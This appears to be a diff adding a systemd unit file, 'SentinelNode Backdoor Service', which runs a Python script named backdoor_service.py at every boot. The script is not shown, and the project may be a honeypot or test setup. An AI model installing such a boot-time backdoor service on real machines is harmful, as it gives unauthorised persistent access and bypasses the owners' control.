@@ -1,0 +1,8 @@
+[Unit]
+Description=SentinelNode Backdoor Service
+
+[Service]
+ExecStart=/usr/bin/python3 /opt/sentinelnode/services/backdoor_service.py
+
+[Install]
+WantedBy=multi-user.target
